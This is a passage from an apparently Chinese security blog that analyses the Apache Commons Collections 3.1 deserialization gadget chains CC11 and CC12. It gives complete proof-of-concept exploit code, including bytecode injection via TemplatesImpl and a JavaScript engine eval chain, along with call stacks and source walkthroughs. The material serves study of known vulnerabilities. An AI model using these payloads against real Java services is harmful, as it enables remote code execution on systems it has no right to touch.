class="title class_">CC11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2 _tfactory成员变量会在反序列化调用构造方法时自动创建赋值</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashSetField</span> <span class="operator">=</span> getField(HashSet.class, <span class="string">&quot;map&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashSetMap</span> <span class="operator">=</span> (HashMap) hashSetField.get(hashSet);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashMapField</span> <span class="operator">=</span> getField(HashMap.class, <span class="string">&quot;table&quot;</span>);</span><br><span class="line">        Object[] array = (Object[]) hashMapField.get(hashSetMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        setFieldValue(node, <span class="string">&quot;key&quot;</span>, tiedMapEntry);</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC11&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashSet);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC11&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-11">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, EvilCat315687595542584</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:<span class="number">120</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">88</span>, CC11</span><br></pre></td></tr></table></figure>
<h2 id="分析-10">分析</h2>
<p><strong>HashSet#readObject</strong>转<strong>HashMap#put</strong>，<strong>e</strong>为<strong>TiedMapEntry</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此<strong>HashMap#put</strong>转<strong>TiedMapEntry#hashCode</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TiedMapEntry#hashCode</strong>到<strong>TiedMapEntry#getValue</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">        (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TiedMapEntry#getValue</strong>继续转<strong>LazyMap#get</strong>，<strong>key</strong>为<strong>TemplatesImpl</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>map</strong>长度为<strong>0</strong>，进入<strong>if</strong>到触发<strong>InvokerTransformer#transform</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面照旧，同样，在最后进行反射赋值操作是防止在生成<strong>POC</strong>的时候<strong>put</strong>操作在本地触发恶意字节码。</p>
<h1 id="commonscollections12">CommonsCollections12</h1>
<p><strong>CC6+JS</strong>。</p>
<h2 id="影响版本-11">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-12">POC</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC12</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(ScriptEngineManager.class),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;getEngineByName&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;js&quot;</span>&#125;),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;eval&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;cmd&#125;)</span><br><span class="line">                        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashSetField</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        hashSetField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashsetMap</span> <span class="operator">=</span> (HashMap) hashSetField.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashMapTable</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        hashMapTable.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) hashMapTable.get(hashsetMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC12&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC12&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-12">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">invokeVirtual_LL_L:-<span class="number">1</span>, <span class="number">243194708</span> (java.lang.invoke.LambdaForm$DMH)</span><br><span class="line">reinvoke:-<span class="number">1</span>, <span class="number">890545344</span> (java.lang.invoke.LambdaForm$BMH)</span><br><span class="line">exactInvoker:-<span class="number">1</span>, <span class="number">702846463</span> (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">linkToCallSite:-<span class="number">1</span>, <span class="number">1105322512</span> (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">:program:<span class="number">1</span>, Script$\^eval\_ (jdk.nashorn.internal.scripts)</span><br><span class="line">invokeStatic_LL_L:-<span class="number">1</span>, <span class="number">101478235</span> (java.lang.invoke.LambdaForm$DMH)</span><br><span class="line">invokeExact_MT:-<span class="number">1</span>, <span class="number">1853205005</span> (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">invoke:<span class="number">640</span>, ScriptFunctionData (jdk.nashorn.internal.runtime)</span><br><span class="line">invoke:<span class="number">228</span>, ScriptFunction (jdk.nashorn.internal.runtime)</span><br><span class="line">apply:<span class="number">393</span>, ScriptRuntime (jdk.nashorn.internal.runtime)</span><br><span class="line">evalImpl:<span class="number">446</span>, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">evalImpl:<span class="number">403</span>, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">evalImpl:<span class="number">399</span>, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">eval:<span class="number">155</span>, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">eval:<span class="number">264</span>, AbstractScriptEngine (javax.script)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:<span class="number">120</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">65</span>, CC12</span><br></pre></td></tr></table></figure>
<h2 id="分析-11">分析</h2>
<p>主要差异就在<strong>Transformer</strong>部分。</p>
<p>一路反射实例化到调用<strong>ScriptEngineManager#getEngineByName</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ScriptEngine <span class="title function_">getEngineByName</span><span class="params">(String shortName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (shortName == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    <span class="comment">//look for registered name first</span></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> != (obj = nameAssociations.get(shortName))) &#123;</span><br><span class="line">        <span class="type">ScriptEngineFactory</span> <span class="variable">spi</span> <span class="operator">=</span> (ScriptEngineFactory)obj;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> spi.getScriptEngine();</span><br><span class="line">            engine.setBindings(getBindings(), ScriptContext.GLOBAL_SCOPE);</span><br><span class="line">            <span class="keyword">return</span> engine;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exp) &#123;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG) exp.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ScriptEngineFactory spi : engineSpis) &#123;</span><br><span class="line">        List&lt;String&gt; names = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            names = spi.getNames();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exp) &#123;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG) exp.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (names != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String name : names) &#123;</span><br><span class="line">                <span class="keyword">if</span> (shortName.equals(name)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> spi.getScriptEngine();</span><br><span class="line">                        engine.setBindings(getBindings(), ScriptContext.GLOBAL_SCOPE);</span><br><span class="line">                        <span class="keyword">return</span> engine;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception exp) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (DEBUG) exp.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>类似的还有<strong>ScriptEngineManager#getEngineByExtension</strong>和<strong>ScriptEngineManager#getEngineByMimeType</strong>。</p>
<p>因此可以修改成这样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(ScriptEngineManager.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;getEngineByExtension&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;js&quot;</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;eval&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;cmd&#125;)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<p>以及这样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(ScriptEngineManager.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;getEngineByMimeType&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;text/javascript&quot;</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;eval&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;cmd&#125;)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h1 id="refer">Refer</h1>
<p><a href="http://wjlshare.com/archives/1498"><strong>Java</strong>
反序列化- <strong>CommonsCollections</strong></a></p>
<p><a href="http://wjlshare.com/archives/1502"><strong>Java</strong>
反序列化- <strong>CommonCollections1</strong> 利用链分析</a></p>
<p><a
href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">动态代理</a></p>
<p><a
href="https://mp.weixin.qq.com/s/tR9uOhNXuvjoFZItk_PzOQ"><strong>Java</strong>
反序列化- <strong>CommonsCollections2</strong> 分析</a></p>
<p><a
href="http://wjlshare.com/archives/1535"><strong>Commons-Collections
1-7</strong> 利用链分析</a></p>
<p><a
